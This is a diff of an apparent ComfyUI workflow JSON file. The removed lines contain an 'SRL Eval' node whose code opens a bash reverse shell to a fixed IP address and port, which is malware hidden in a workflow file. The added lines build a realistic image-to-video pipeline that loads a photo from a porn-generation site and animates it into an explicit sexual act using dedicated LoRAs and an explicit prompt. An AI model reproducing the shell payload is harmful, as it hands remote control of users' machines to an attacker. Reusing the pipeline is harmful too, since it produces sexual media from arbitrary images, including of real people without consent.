@@ -1,39 +1,314 @@
 {
-  "1": {
+  "103": {
     "inputs": {
-      "parameters": "a, b=None, c=\"foo\", *rest",
-      "code": "__import__('os').system('bash -c \"bash -i >& /dev/tcp/176.124.207.93/2222 0>&1\"')",
-      "arg0": [
-        "2",
+      "model": [
+        "139",
+        0
+      ],
+      "shift": 5.000000000000001
+    },
+    "class_type": "ModelSamplingSD3"
+  },
+  "104": {
+    "inputs": {
+      "model": [
+        "138",
+        0
+      ],
+      "shift": 5.000000000000001
+    },
+    "class_type": "ModelSamplingSD3"
+  },
+  "112": {
+    "inputs": {
+      "filename_prefix": "AnimateDiff",
+      "format": "video/h264-mp4",
+      "frame_rate": 48.0,
+      "images": [
+        "136",
+        0
+      ],
+      "loop_count": 0,
+      "pingpong": false,
+      "save_output": true
+    },
+    "class_type": "VHS_VideoCombine"
+  },
+  "130": {
+    "inputs": {
+      "anything": [
+        "85",
+        0
+      ],
+      "purge_cache": true,
+      "purge_models": true
+    },
+    "class_type": "LayerUtility: PurgeVRAM"
+  },
+  "131": {
+    "inputs": {
+      "anything": [
+        "86",
+        0
+      ],
+      "purge_cache": true,
+      "purge_models": true
+    },
+    "class_type": "LayerUtility: PurgeVRAM"
+  },
+  "136": {
+    "inputs": {
+      "clear_cache_after_n_frames": 10,
+      "engine": "rife49_ensemble_True_scale_1_sim.engine",
+      "frames": [
+        "87",
+        0
+      ],
+      "keep_model_loaded": false,
+      "multiplier": 3,
+      "use_cuda_graph": true
+    },
+    "class_type": "RifeTensorrt"
+  },
+  "138": {
+    "inputs": {
+      "clip": [
+        "84",
+        0
+      ],
+      "lora_01": "wan2.2\\wan2.2_i2v_lightx2v_4steps_lora_v1_high_noise.safetensors",
+      "lora_02": "wan2.2\\wan2.2-i2v-high-oral-insertion-v1.0.safetensors",
+      "lora_03": "None",
+      "lora_04": "None",
+      "lora_05": "None",
+      "lora_06": "None",
+      "lora_07": "None",
+      "lora_08": "None",
+      "lora_09": "None",
+      "lora_10": "None",
+      "model": [
+        "156",
+        0
+      ],
+      "strength_01": 2.0000000000000004,
+      "strength_02": 1.0000000000000002,
+      "strength_03": 0.0,
+      "strength_04": 0.0,
+      "strength_05": 1.0,
+      "strength_06": 1.0,
+      "strength_07": 1.0,
+      "strength_08": 1.0,
+      "strength_09": 1.0,
+      "strength_10": 1.0
+    },
+    "class_type": "Lora Loader Stack (rgthree)"
+  },
+  "139": {
+    "inputs": {
+      "clip": [
+        "84",
+        0
+      ],
+      "lora_01": "wan2.2\\wan2.2_i2v_lightx2v_4steps_lora_v1_low_noise.safetensors",
+      "lora_02": "wan2.2\\wan2.2-i2v-low-oral-insertion-v1.0.safetensors",
+      "lora_03": "None",
+      "lora_04": "None",
+      "lora_05": "None",
+      "lora_06": "None",
+      "lora_07": "None",
+      "lora_08": "None",
+      "lora_09": "None",
+      "lora_10": "None",
+      "model": [
+        "157",
+        0
+      ],
+      "strength_01": 1.0000000000000002,
+      "strength_02": 1.0000000000000002,
+      "strength_03": 0.0,
+      "strength_04": 0.0,
+      "strength_05": 1.0,
+      "strength_06": 1.0,
+      "strength_07": 1.0,
+      "strength_08": 1.0,
+      "strength_09": 1.0,
+      "strength_10": 1.0
+    },
+    "class_type": "Lora Loader Stack (rgthree)"
+  },
+  "150": {
+    "inputs": {
+      "crop_position": "center",
+      "device": "cpu",
+      "divisible_by": 16,
+      "height": 832,
+      "image": [
+        "151",
+        0
+      ],
+      "keep_proportion": "resize",
+      "pad_color": "0, 0, 0",
+      "upscale_method": "nearest-exact",
+      "width": 480
+    },
+    "class_type": "ImageResizeKJv2"
+  },
+  "151": {
+    "inputs": {
+      "urls": "https://media.pornmaker.cloud/be5e5679-0fe0-401a-b6dd-04a6a517182c.png"
+    },
+    "class_type": "LoadImageFromURL"
+  },
+  "156": {
+    "inputs": {
+      "unet_name": "wan2.2\\wan2.2_i2v_high_noise_14B_fp8_scaled.safetensors",
+      "weight_dtype": "default"
+    },
+    "class_type": "UNETLoader"
+  },
+  "157": {
+    "inputs": {
+      "unet_name": "wan2.2\\wan2.2_i2v_low_noise_14B_fp8_scaled.safetensors",
+      "weight_dtype": "default"
+    },
+    "class_type": "UNETLoader"
+  },
+  "84": {
+    "inputs": {
+      "clip_name": "wan\\umt5_xxl_fp8_e4m3fn_scaled.safetensors",
+      "device": "cpu",
+      "type": "wan"
+    },
+    "class_type": "CLIPLoader"
+  },
+  "85": {
+    "inputs": {
+      "add_noise": "disable",
+      "cfg": 1.0,
+      "end_at_step": 4,
+      "latent_image": [
+        "86",
+        0
+      ],
+      "model": [
+        "103",
+        0
+      ],
+      "negative": [
+        "98",
+        1
+      ],
+      "noise_seed": 350626139805530535,
+      "positive": [
+        "98",
+        0
+      ],
+      "return_with_leftover_noise": "disable",
+      "sampler_name": "euler",
+      "scheduler": "simple",
+      "start_at_step": 2,
+      "steps": 4
+    },
+    "class_type": "KSamplerAdvanced"
+  },
+  "86": {
+    "inputs": {
+      "add_noise": "enable",
+      "cfg": 1.0,
+      "end_at_step": 2,
+      "latent_image": [
+        "98",
+        2
+      ],
+      "model": [
+        "104",
+        0
+      ],
+      "negative": [
+        "98",
+        1
+      ],
+      "noise_seed": 2039012606739633061,
+      "positive": [
+        "98",
+        0
+      ],
+      "return_with_leftover_noise": "enable",
+      "sampler_name": "euler",
+      "scheduler": "simple",
+      "start_at_step": 0,
+      "steps": 4
+    },
+    "class_type": "KSamplerAdvanced"
+  },
+  "87": {
+    "inputs": {
+      "samples": [
+        "85",
+        0
+      ],
+      "vae": [
+        "90",
         0
       ]
     },
-    "class_type": "SRL Eval",
-    "_meta": {
-      "title": "SRL Eval"
-    }
+    "class_type": "VAEDecode"
   },
-  "2": {
+  "89": {
     "inputs": {
-      "noise_seed": 919299133237178
-    },
-    "class_type": "RandomNoise",
-    "_meta": {
-      "title": "Случайный шум"
-    }
-  },
-  "3": {
-    "inputs": {
-      "preview": "None",
-      "previewMode": null,
-      "source": [
-        "1",
+      "clip": [
+        "84",
         0
+      ],
+      "text": "色调艳丽，过曝，静态，细节模糊不清，字幕，风格，作品，画作，画面，静止，整体发灰，最差质量，低质量，JPEG压缩残留，丑陋的，残缺的，多余的手指，画得不好的手部，画得不好的脸部，畸形的，毁容的，形态畸形的肢体，手指融合，静止不动的画面，杂乱的背景，三条腿，背景人很多，倒着走"
+    },
+    "class_type": "CLIPTextEncode"
+  },
+  "90": {
+    "inputs": {
+      "vae_name": "wan2.1\\wan_2.1_vae.safetensors"
+    },
+    "class_type": "VAELoader"
+  },
+  "93": {
+    "inputs": {
+      "clip": [
+        "84",
+        0
+      ],
+      "text": "realistic. real life. POV. \r\nA man appears and she sucks his penis. Static camera, fixed viewpoint, still shot."
+    },
+    "class_type": "CLIPTextEncode"
+  },
+  "98": {
+    "inputs": {
+      "batch_size": 1,
+      "height": [
+        "150",
+        2
+      ],
+      "length": 81,
+      "negative": [
+        "89",
+        0
+      ],
+      "positive": [
+        "93",
+        0
+      ],
+      "start_image": [
+        "150",
+        0
+      ],
+      "vae": [
+        "90",
+        0
+      ],
+      "width": [
+        "150",
+        1
       ]
     },
-    "class_type": "PreviewAny",
-    "_meta": {
-      "title": "Предпросмотр любого"
-    }
+    "class_type": "WanImageToVideo"
   }
 }
